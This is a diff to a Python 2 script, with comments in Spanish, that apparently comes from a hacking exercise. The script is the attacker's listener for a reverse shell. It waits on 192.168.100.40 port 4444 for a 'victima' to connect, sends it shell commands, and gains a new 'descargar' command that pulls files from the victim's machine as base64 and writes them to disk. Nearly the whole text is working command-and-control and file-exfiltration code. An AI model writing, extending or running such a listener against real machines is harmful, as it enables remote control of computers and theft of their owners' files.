@@ -1,5 +1,6 @@
 import socket
 import json
+import base64
 
 class Listener:
     def __init__(self, ip , port):
@@ -9,11 +10,11 @@ class Listener:
         listener.bind((ip, port)) #Abre el servidor
         listener.listen(0)
 
-        print("Esperando por conexiones")
+        print("[+] Esperando por conexiones")
 
         self.connection, address = listener.accept() #Acepta la conexion de la victima al servidor 
 
-        print("Tenemos una conexion de " + str(address))
+        print("[+] Tenemos una conexion de " + str(address))
 
     def reliable_send(self, data):
         json_data = json.dumps(data)
@@ -27,7 +28,12 @@ class Listener:
                 return json.loads(json_data)
             except ValueError:
                 continue
-
+    
+    def escribir_archivo(self, path, content):
+        with open(path, "wb") as file:
+            file.write(base64.b64decode(content))
+            return "[+] Descarga Completa."
+     
     def ejecutar_remoto(self, command): #Ejecuta el comando que se envio en Run()
         self.reliable_send(command)
         
@@ -43,6 +49,10 @@ class Listener:
             command = raw_input("shell>>")
             command = command.split(" ")
             result = self.ejecutar_remoto(command)
+            
+            if command[0] == "descargar":
+                result = self.escribir_archivo(command[1], result)
+            
             print(result)  #Muestra en pantalla el valor retornado
 
 escuchar = Listener("192.168.100.40", 4444) #Recibe los datos de la victima
